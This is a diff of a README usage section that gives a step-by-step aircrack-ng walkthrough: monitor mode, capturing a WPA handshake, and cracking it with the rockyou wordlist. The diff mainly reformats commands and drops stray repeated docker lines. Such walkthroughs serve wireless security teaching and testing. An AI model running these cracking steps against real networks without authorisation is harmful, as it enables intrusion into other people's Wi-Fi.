@@ -2,26 +2,26 @@
 
 ##  Usage 
  ```sh
- $ sudo airmon-ng check kill
-    $ ip addr
-    $ iwconfig
-    # See interfaces
+# See interfaces
+$ ip addr
+$ iwconfig
+
 
 
 !kill processes
-sudo airmon-ng check kill
+$ sudo airmon-ng check kill
 
 !Start monitor mode
-sudo airmon-ng start wlan0
+$ sudo airmon-ng start wlan0
 
 !Verify that monitor mode is used
-sudo airmon-ng 
+$ sudo airmon-ng 
 
 !You could also use iwconfig to check that interface is in monitor mode:
-iwconfig
+$ iwconfig
 
-! Get the AP's MAC address and channel
-sudo airodump-ng wlan0mon
+! Get the Acess Point MAC address and channel
+$ sudo airodump-ng wlan0mon
 
 ! AP-MAC & channel - you need to select your own here:
 ESSID: 90:9A:4A:B8:F3:FB
@@ -42,16 +42,9 @@ wireshark hack1-01.cap
 eapol
 
 !Stop monitor mode
-airmon-ng stop wlan0mon
+$ airmon-ng stop wlan0mon
 
 !Crack file with Rock you or another wordlist
 !Make sure you have rockyou in text format (unzip file on Kali)
 !Replace hack1-01.cap with your file name
 aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
-    // Inside container shell
-     $ docker exec -it app sh
-    // Inside container shell
-    $ docker exec -it app sh
-    // Inside container shell
-    $ docker exec -it app sh
-    // Inside container shell
